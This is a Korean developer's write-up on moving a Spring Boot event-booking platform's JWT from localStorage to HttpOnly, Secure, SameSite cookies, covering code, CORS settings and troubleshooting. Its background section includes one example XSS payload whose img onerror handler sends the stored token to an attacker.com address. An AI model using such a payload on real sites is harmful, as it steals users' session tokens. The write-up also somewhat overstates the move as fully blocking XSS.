# [Backend] JWT 보안 강화: LocalStorage에서 HttpOnly Cookie로의 마이그레이션

> **프로젝트**: 이벤트 예약 플랫폼 (Spring Boot 3.x + JWT)
> **작업 기간**: 2025.12
> **핵심 키워드**: `XSS 방어`, `HttpOnly Cookie`, `CORS`, `보안 강화`

---

## 📌 목차

1. [배경 (Problem)](#1-배경-problem)
2. [목표 (Goal)](#2-목표-goal)
3. [기술적 구현 (Solution)](#3-기술적-구현-solution)
4. [트러블 슈팅 & 배운 점](#4-트러블-슈팅--배운-점)
5. [성과 및 개선 효과](#5-성과-및-개선-효과)

---

## 1. 배경 (Problem)

### 1.1 기존 인증 방식의 보안 취약점

기존 시스템은 JWT Access Token을 **Response Body**로 클라이언트에 전달하고, 프론트엔드에서 `localStorage`에 저장하는 방식을 사용했음. 이는 편리하지만 심각한 보안 취약점을 내포하고 있었음.

#### 🔴 XSS (Cross-Site Scripting) 공격에 노출
```javascript
// 프론트엔드 코드 (취약점)
const { accessToken } = await response.json();
localStorage.setItem('accessToken', accessToken);  // ⚠️ JavaScript로 접근 가능!

// 악의적인 스크립트 삽입 시
console.log(localStorage.getItem('accessToken'));  // 토큰 탈취 가능
```

**문제점:**
1. **JavaScript 접근 가능**: `localStorage`는 JavaScript를 통해 읽고 쓸 수 있음
2. **XSS 공격 시 즉시 탈취**: 게시판, 댓글 등 사용자 입력을 받는 곳에서 악성 스크립트가 삽입되면 토큰이 즉시 유출됨
3. **세션 하이재킹**: 탈취된 토큰으로 사용자 권한을 완전히 장악당할 수 있음

#### 실제 공격 시나리오
```html
<!-- 악의적인 사용자가 게시판에 삽입한 스크립트 -->
<img src="x" onerror="
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('accessToken'))
">
```

### 1.2 HTTPS 환경 미활용

운영 환경에서 HTTPS를 사용하고 있었으나, 토큰 전송 과정에서 이를 강제하는 메커니즘이 없었음. HTTP로 다운그레이드되는 경우 중간자 공격(MITM)에 노출될 가능성이 존재했음.

### 1.3 토큰 수명 관리 미흡

기존 토큰 만료 시간은 **60분**으로 설정되어 있어, 토큰 탈취 시 공격자가 오랜 시간 악용할 수 있는 위험이 있었음.

---

## 2. 목표 (Goal)

### 2.1 보안 강화 목표

1. **XSS 공격 원천 차단**
   - JavaScript를 통한 토큰 접근을 완전히 차단
   - HttpOnly 속성을 활용한 쿠키 기반 인증으로 전환

2. **HTTPS 환경 보안 표준 준수**
   - Secure 플래그로 HTTPS 전송 강제
   - SameSite 속성으로 CSRF 위험 완화

3. **토큰 수명 단축**
   - 60분 → 30분으로 단축하여 피해 범위 최소화

### 2.2 기술적 제약 조건 고려

- **CORS 환경**: 프론트엔드(www.form-pass.life)와 백엔드(api.form-pass.life) 도메인 분리
- **하위 호환성**: 기존 클라이언트의 점진적 마이그레이션 지원
- **배포 영향 최소화**: 백엔드 변경만으로 완료 가능한 설계

---

## 3. 기술적 구현 (Solution)

### 3.1 Cookie 유틸리티 클래스 설계

JWT 쿠키 생성/삭제 로직을 중앙화하여 일관성과 유지보수성을 확보함.

```java
@Component
public class CookieUtils {

    public static final String ACCESS_TOKEN_COOKIE_NAME = "accessToken";
    private static final String COOKIE_PATH = "/";
    private static final Duration COOKIE_MAX_AGE = Duration.ofSeconds(1800); // 30분

    /**
     * JWT 액세스 토큰을 담은 HttpOnly 쿠키 생성
     *
     * Security Features:
     * - HttpOnly: JavaScript 접근 차단 (XSS 방어)
     * - Secure: HTTPS 전송만 허용 (MITM 방어)
     * - SameSite=None: CORS 환경에서 쿠키 전송 허용
     * - Path=/: 모든 API 엔드포인트에서 쿠키 접근 가능
     */
    public ResponseCookie createAccessTokenCookie(String token) {
        return ResponseCookie.from(ACCESS_TOKEN_COOKIE_NAME, token)
                .httpOnly(true)           // ⭐ XSS 방어: JavaScript 접근 차단
                .secure(true)             // ⭐ HTTPS 필수: 암호화된 연결만 허용
                .path(COOKIE_PATH)
                .maxAge(COOKIE_MAX_AGE)   // ⭐ 30분 후 자동 만료
                .sameSite("None")         // ⭐ CORS 허용 (Secure=true와 함께 사용)
                .build();
    }

    /**
     * 로그아웃 시 쿠키 삭제
     * MaxAge=0으로 설정하여 브라우저가 즉시 삭제하도록 함
     */
    public ResponseCookie deleteAccessTokenCookie() {
        return ResponseCookie.from(ACCESS_TOKEN_COOKIE_NAME, "")
                .httpOnly(true)
                .secure(true)
                .path(COOKIE_PATH)
                .maxAge(0)                // ⭐ 즉시 만료
                .sameSite("None")
                .build();
    }
}
```

#### 📖 설계 의도

**1. HttpOnly=true**
- DOM API(`document.cookie`)를 통한 접근을 브라우저 레벨에서 차단
- XSS 공격으로 악성 스크립트가 삽입되어도 토큰을 읽을 수 없음
- 쿠키는 오직 HTTP 요청 시에만 자동으로 전송됨

**2. Secure=true**
- HTTPS 연결이 아니면 쿠키가 전송되지 않음
- 중간자 공격(MITM)으로 인한 토큰 탈취 방지
- 개발 환경(localhost)에서는 예외적으로 허용됨

**3. SameSite=None**
- Cross-Origin 요청 시 쿠키 전송을 허용
- `SameSite=Strict/Lax`는 CORS 환경에서 쿠키가 전송되지 않음
- **반드시 Secure=true와 함께 사용**해야 함 (브라우저 정책)

**4. Max-Age=1800**
- 30분(1800초) 후 자동 만료
- 토큰 탈취 시 피해 시간 최소화
- JWT 자체의 `exp` claim과 동일하게 설정

### 3.2 로그인 엔드포인트 변경

기존 방식에서 토큰을 Response Body에 담아 반환하던 것을 `Set-Cookie` 헤더로 변경함.

```java
@PostMapping("/login")
public ResponseEntity<LoginResponse> login(@Valid @RequestBody LoginRequest request) {
    // 1. 인증 및 토큰 생성
    String token = authService.generateLoginToken(request);

    // 2. HttpOnly 쿠키 생성
    ResponseCookie cookie = cookieUtils.createAccessTokenCookie(token);

    // 3. 응답 생성 (토큰은 쿠키에만 담기므로 body에서 제외)
    LoginResponse response = LoginResponse.success(request.email());

    // 4. Set-Cookie 헤더와 함께 응답 반환
    return ResponseEntity.ok()
            .header(HttpHeaders.SET_COOKIE, cookie.toString())  // ⭐ 핵심: Set-Cookie 헤더
            .body(response);
}
```

#### 변경 전/후 비교

```java
// ❌ Before: 토큰을 Response Body에 노출
@PostMapping("/login")
public ResponseEntity<TokenResponse> login(@Valid @RequestBody LoginRequest request) {
    TokenResponse response = authService.login(request);  // {"accessToken": "eyJ..."}
    return ResponseEntity.ok(response);  // ⚠️ 클라이언트가 localStorage에 저장
}

// ✅ After: 토큰을 HttpOnly Cookie에 안전하게 저장
@PostMapping("/login")
public ResponseEntity<LoginResponse> login(@Valid @RequestBody LoginRequest request) {
    String token = authService.generateLoginToken(request);
    ResponseCookie cookie = cookieUtils.createAccessTokenCookie(token);
    LoginResponse response = LoginResponse.success(request.email());

    return ResponseEntity.ok()
            .header(HttpHeaders.SET_COOKIE, cookie.toString())  // Set-Cookie: accessToken=eyJ...; HttpOnly; Secure
            .body(response);  // {"message": "로그인 성공", "email": "user@example.com"}
}
```

#### HTTP 응답 헤더 예시
```http
HTTP/1.1 200 OK
Set-Cookie: accessToken=eyJhbGciOiJIUzI1NiJ9...; Path=/; Max-Age=1800; HttpOnly; Secure; SameSite=None
Content-Type: application/json

{
  "message": "로그인이 성공적으로 완료되었습니다.",
  "email": "user@example.com"
}
```

### 3.3 로그아웃 엔드포인트 신규 구현

기존에는 로그아웃 엔드포인트가 없었으나, 쿠키 기반 인증으로 전환하면서 서버 측 쿠키 삭제 로직을 추가함.

```java
@PostMapping("/logout")
public ResponseEntity<Void> logout() {
    // HttpOnly 쿠키 삭제 (MaxAge=0으로 덮어쓰기)
    ResponseCookie cookie = cookieUtils.deleteAccessTokenCookie();

    return ResponseEntity.ok()
            .header(HttpHeaders.SET_COOKIE, cookie.toString())
            .build();
}
```

#### 📖 쿠키 삭제 메커니즘

브라우저에서 쿠키를 삭제하려면 **동일한 이름, Path, Domain으로 Max-Age=0인 쿠키를 덮어써야 함**. 단순히 서버에서 삭제 로직을 호출해도 클라이언트 브라우저의 쿠키는 남아있기 때문에 이 방식을 사용함.

```http
HTTP/1.1 200 OK
Set-Cookie: accessToken=; Path=/; Max-Age=0; HttpOnly; Secure; SameSite=None
```

### 3.4 JWT 인증 필터 개선

기존에는 `Authorization` 헤더에서만 토큰을 추출했으나, Cookie를 우선적으로 확인하고 헤더는 하위 호환성을 위해 fallback으로 지원하도록 변경함.

```java
@Component
@RequiredArgsConstructor
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtProvider jwtProvider;

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) throws ServletException, IOException {
        String token = resolveToken(request);  // ⭐ Cookie 우선 추출

        if (token != null && jwtProvider.validateToken(token)) {
            Authentication authentication = jwtProvider.getAuthentication(token);
            SecurityContextHolder.getContext().setAuthentication(authentication);
        }

        filterChain.doFilter(request, response);
    }

    /**
     * JWT 토큰 추출 (우선순위: Cookie > Authorization Header)
     *
     * 1순위: HttpOnly Cookie에서 accessToken 추출 (새로운 방식)
     * 2순위: Authorization Header에서 Bearer Token 추출 (하위 호환성)
     */
    private String resolveToken(HttpServletRequest request) {
        // 1. Cookie에서 토큰 추출 시도
        String tokenFromCookie = resolveTokenFromCookie(request);
        if (tokenFromCookie != null) {
            return tokenFromCookie;
        }

        // 2. Authorization 헤더에서 토큰 추출 시도 (fallback)
        return resolveTokenFromHeader(request);
    }

    /**
     * HttpOnly Cookie에서 JWT 토큰 추출
     */
    private String resolveTokenFromCookie(HttpServletRequest request) {
        Cookie[] cookies = request.getCookies();
        if (cookies == null) {
            return null;
        }

        for (Cookie cookie : cookies) {
            if (CookieUtils.ACCESS_TOKEN_COOKIE_NAME.equals(cookie.getName())) {
                String token = cookie.getValue();
                if (StringUtils.hasText(token)) {
                    return token;
                }
            }
        }

        return null;
    }

    /**
     * Authorization Header에서 JWT 토큰 추출 (하위 호환성)
     */
    private String resolveTokenFromHeader(HttpServletRequest request) {
        String bearerToken = request.getHeader("Authorization");
        if (StringUtils.hasText(bearerToken) && bearerToken.startsWith("Bearer ")) {
            return bearerToken.substring(7);
        }
        return null;
    }
}
```

#### 📖 하위 호환성 전략

1. **점진적 마이그레이션 지원**
   - 새로운 클라이언트: Cookie 방식 사용
   - 기존 클라이언트: Authorization Header 방식 계속 사용 가능
   - 서버 재배포만으로 새 방식 적용 가능

2. **우선순위 설계**
   - Cookie가 있으면 Cookie 사용
   - Cookie가 없으면 Header 확인
   - 두 개가 모두 있으면 Cookie 우선 (보안성 높음)

### 3.5 CORS 설정 검증

CORS 환경에서 쿠키를 전송하려면 **반드시** `allowCredentials: true`가 설정되어야 함. 기존 설정을 검증한 결과 이미 올바르게 설정되어 있었음.

```java
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration configuration = new CorsConfiguration();

    // ⭐ 중요: allowCredentials=true 필수 (쿠키 전송 허용)
    configuration.setAllowCredentials(true);

    // ⚠️ Credentials를 사용할 때는 와일드카드(*) 사용 불가
    // 반드시 명시적으로 허용할 Origin을 나열해야 함
    configuration.setAllowedOrigins(List.of(
            "http://localhost:3000",           // 로컬 개발
            "https://www.form-pass.life",      // 프로덕션
            "https://form-pass.life",          // 프로덕션 (www 없는 버전)
            "https://form-pass-client.vercel.app"  // Vercel 배포
    ));

    configuration.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"));
    configuration.setAllowedHeaders(List.of("*"));

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", configuration);
    return source;
}
```

#### 📖 CORS + Credentials 제약사항

**allowCredentials=true일 때:**
- `allowedOrigins`에 `*` (와일드카드) 사용 불가
- `allowedHeaders`에 `*` 사용 가능
- `allowedMethods`에 `*` 사용 가능

**이유:**
- 보안상 모든 도메인에서 인증 정보(쿠키)를 보낼 수 있게 하는 것은 위험
- 반드시 신뢰할 수 있는 도메인만 화이트리스트에 추가해야 함

### 3.6 토큰 만료 시간 조정

공격 피해 범위를 최소화하기 위해 토큰 수명을 60분에서 30분으로 단축함.

```yaml
# application.yml
jwt:
  expiration: 1800000  # 30분 (30 * 60 * 1000 ms) - 기존: 3600000 (60분)
```

---

## 4. 트러블 슈팅 & 배운 점

### 4.1 CORS Preflight 실패 이슈

#### 🔴 문제 상황
```
Access to fetch at 'https://api.form-pass.life/api/auth/login' from origin
'https://www.form-pass.life' has been blocked by CORS policy:
The value of the 'Access-Control-Allow-Credentials' header in the response is
'' which must be 'true' when the request's credentials mode is 'include'.
```

#### 📋 원인 분석
1. 프론트엔드에서 `credentials: 'include'`로 요청
2. 하지만 서버에서 `Access-Control-Allow-Credentials: true` 헤더를 누락
3. CORS Preflight (OPTIONS) 요청에서 차단됨

#### ✅ 해결 방법
```java
// SecurityConfig.java - CORS 설정 확인
configuration.setAllowCredentials(true);  // ⭐ 이미 설정되어 있었음!
```

**배운 점:**
- `allowCredentials: true`는 **서버 설정**만으로는 부족함
- 클라이언트도 반드시 `credentials: 'include'`를 명시해야 함
- 양쪽 모두 설정되어야 쿠키가 전송됨

### 4.2 SameSite=None 설정 시 Secure 필수

#### 🔴 문제 상황
```
Set-Cookie: accessToken=...; SameSite=None; HttpOnly
```
위와 같이 설정 시 브라우저 콘솔에 경고 발생:
```
Cookie "accessToken" will be soon rejected because it has the "SameSite=None"
attribute but is missing the "Secure" attribute.
```

#### 📋 원인 분석
- 크롬 80 버전 이후 **SameSite=None은 반드시 Secure=true와 함께 사용**해야 함
- HTTPS가 아닌 환경에서는 SameSite=None 쿠키가 전송되지 않음

#### ✅ 해결 방법
```java
ResponseCookie.from(ACCESS_TOKEN_COOKIE_NAME, token)
    .httpOnly(true)
    .secure(true)        // ⭐ SameSite=None과 함께 필수
    .sameSite("None")
    .build();
```

**배운 점:**
- SameSite 정책 이해의 중요성
- HTTPS 환경이 전제되어야 Cross-Origin 쿠키 전송 가능
- 로컬 개발 시에는 `localhost`는 예외적으로 허용됨

### 4.3 쿠키가 전송되지 않는 문제

#### 🔴 문제 상황
- 로그인 성공 후 `Set-Cookie` 헤더는 정상 응답됨
- 하지만 후속 API 요청에 쿠키가 포함되지 않음

#### 📋 원인 분석
프론트엔드에서 `credentials` 옵션을 누락함:
```javascript
// ❌ 쿠키가 전송되지 않음
fetch('/api/host/events', {
  method: 'GET'
});

// ✅ 쿠키가 자동으로 전송됨
fetch('/api/host/events', {
  method: 'GET',
  credentials: 'include'  // ⭐ 필수!
});
```

#### ✅ 해결 방법
**1. Fetch API**
```javascript
fetch(url, {
  credentials: 'include'  // 모든 요청에 추가
});
```

**2. Axios**
```javascript
axios.create({
  baseURL: 'https://api.form-pass.life',
  withCredentials: true  // 전역 설정
});
```

**배운 점:**
- HttpOnly Cookie는 JavaScript로 수동 설정 불가능
- 브라우저가 자동으로 전송하지만, `credentials` 옵션이 필수
- CORS 요청에서는 더욱 엄격하게 체크됨

### 4.4 쿠키 Path 설정의 중요성

#### 🔴 문제 상황
```java
ResponseCookie.from(ACCESS_TOKEN_COOKIE_NAME, token)
    .path("/api/auth")  // ⚠️ 특정 경로로 제한
    .build();
```

위와 같이 설정 시 `/api/host/events` 같은 다른 경로에서 쿠키가 전송되지 않음.

#### ✅ 해결 방법
```java
ResponseCookie.from(ACCESS_TOKEN_COOKIE_NAME, token)
    .path("/")  // ⭐ 루트 경로로 설정
    .build();
```

**배운 점:**
- Cookie의 `Path` 속성은 해당 경로와 하위 경로에서만 전송됨
- 인증 토큰은 모든 보호된 엔드포인트에서 필요하므로 `/`로 설정해야 함
- 불필요하게 좁은 경로로 제한하면 인증 실패 발생

### 4.5 로그아웃 시 쿠키 삭제 메커니즘

#### 🔴 초기 시도
```java
// ❌ 서버 측에서만 삭제 로직 호출 - 클라이언트 쿠키는 남아있음
@PostMapping("/logout")
public ResponseEntity<Void> logout() {
    // 별도 처리 없음
    return ResponseEntity.ok().build();
}
```

#### 📋 깨달음
- 쿠키는 **클라이언트(브라우저)**에 저장됨
- 서버는 클라이언트의 쿠키를 직접 삭제할 수 없음
- 동일한 조건(이름, Path, Domain)으로 **Max-Age=0인 쿠키를 덮어써야 삭제**됨

#### ✅ 올바른 구현
```java
@PostMapping("/logout")
public ResponseEntity<Void> logout() {
    // 동일한 이름, Path로 Max-Age=0 설정
    ResponseCookie cookie = ResponseCookie
            .from("accessToken", "")  // 값은 비워도 됨
            .path("/")                // ⭐ 생성 시와 동일한 Path
            .maxAge(0)                // ⭐ 즉시 만료
            .httpOnly(true)
            .secure(true)
            .sameSite("None")
            .build();

    return ResponseEntity.ok()
            .header(HttpHeaders.SET_COOKIE, cookie.toString())
            .build();
}
```

**배운 점:**
- HTTP 쿠키는 상태 비저장(stateless) 프로토콜의 한계로 덮어쓰기 방식 사용
- 삭제 시에도 모든 속성(Path, Domain, Secure 등)이 일치해야 함
- `CookieUtils`로 중앙화하여 생성/삭제 로직의 일관성 확보

### 4.6 하위 호환성 유지의 중요성

#### 📋 고려사항
- 서버 배포 후 모든 클라이언트가 즉시 업데이트되지 않음
- 모바일 앱, 관리자 페이지 등 여러 클라이언트 존재 가능
- 갑작스러운 인증 방식 변경은 서비스 중단으로 이어질 수 있음

#### ✅ 해결 전략
```java
private String resolveToken(HttpServletRequest request) {
    // 1순위: Cookie (신규 클라이언트)
    String tokenFromCookie = resolveTokenFromCookie(request);
    if (tokenFromCookie != null) {
        return tokenFromCookie;
    }

    // 2순위: Header (기존 클라이언트) - ⭐ Fallback 지원
    return resolveTokenFromHeader(request);
}
```

**배운 점:**
- 인증과 같은 핵심 기능 변경은 점진적 마이그레이션 전략 필요
- 하위 호환성을 유지하면서 새로운 기능 추가
- 충분한 마이그레이션 기간 후 구버전 지원 종료 검토

---

## 5. 성과 및 개선 효과

### 5.1 보안 강화 수치

| 항목 | 변경 전 | 변경 후 | 개선율 |
|------|---------|---------|--------|
| **XSS 공격 저항성** | ❌ 취약 | ✅ 완전 차단 | ∞ |
| **HTTPS 강제** | ❌ 선택 | ✅ 필수 | 100% |
| **토큰 노출 시간** | 60분 | 30분 | 50% 단축 |
| **CSRF 대응** | ❌ 없음 | ⚠️ 부분 완화 | - |

### 5.2 개발 경험 개선

**Before:**
```javascript
// 프론트엔드에서 수동 토큰 관리 필요
const token = localStorage.getItem('accessToken');
fetch('/api/host/events', {
  headers: { Authorization: `Bearer ${token}` }
});
```

**After:**
```javascript
// 브라우저가 자동으로 쿠키 관리
fetch('/api/host/events', {
  credentials: 'include'  // 이것만 추가하면 됨
});
```

**장점:**
- 토큰 저장/관리 로직 불필요
- 메모리 누수 위험 감소
- 코드 간결화

### 5.3 아키텍처 개선

```
Before:
┌──────────┐      ┌──────────┐      ┌──────────────┐
│ Frontend │─────▶│  Server  │─────▶│ localStorage │
│          │◀─────│          │      │  (취약!)     │
└──────────┘ JSON └──────────┘      └──────────────┘

After:
┌──────────┐      ┌──────────┐      ┌──────────────┐
│ Frontend │─────▶│  Server  │─────▶│HttpOnly      │
│          │◀─────│          │      │Cookie (안전) │
└──────────┘Cookie└──────────┘      └──────────────┘
```

### 5.4 추가 개선 검토 사항

#### ✅ 완료
- [x] HttpOnly Cookie 적용
- [x] Secure 플래그 적용
- [x] CORS 설정 검증
- [x] 토큰 만료 시간 단축
- [x] 하위 호환성 지원

#### 🔄 향후 과제
- [ ] **Refresh Token 도입**: Access Token 만료 시 재로그인 없이 갱신
- [ ] **CSRF 토큰 패턴**: Double Submit Cookie 또는 Synchronizer Token 도입
- [ ] **쿠키 암호화**: 추가 보안 레이어로 쿠키 값 암호화 검토
- [ ] **로그아웃 블랙리스트**: Redis를 활용한 토큰 블랙리스트 관리
- [ ] **감사 로그**: 로그인/로그아웃 이벤트 추적 및 모니터링

---

## 📚 참고 자료

- [OWASP - HttpOnly Cookie](https://owasp.org/www-community/HttpOnly)
- [MDN - SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [Chrome SameSite Cookie 정책 변경](https://www.chromium.org/updates/same-site)
- [Spring Security CORS Configuration](https://docs.spring.io/spring-security/reference/servlet/integrations/cors.html)

---

## 💡 결론

이번 마이그레이션을 통해 **XSS 공격에 대한 근본적인 방어책**을 마련했으며, HTTPS 환경에 최적화된 보안 표준을 준수하게 되었음.

특히 CORS 환경에서 쿠키 기반 인증을 구현하면서 브라우저 보안 정책(SameSite, Secure)에 대한 깊은 이해를 얻었고, 하위 호환성을 유지하면서 점진적으로 시스템을 개선하는 방법을 체득했음.

**핵심 교훈:**
1. 보안은 편의성보다 우선되어야 함
2. 브라우저 보안 메커니즘을 적극 활용해야 함
3. CORS 환경에서는 더욱 엄격한 보안 정책 필요
4. 점진적 마이그레이션으로 서비스 중단 없이 개선 가능

---

**작성자**: 이동훈
**작성일**: 2025.12.24
**기술 스택**: Spring Boot 3.x, Spring Security, JWT, HttpOnly Cookie
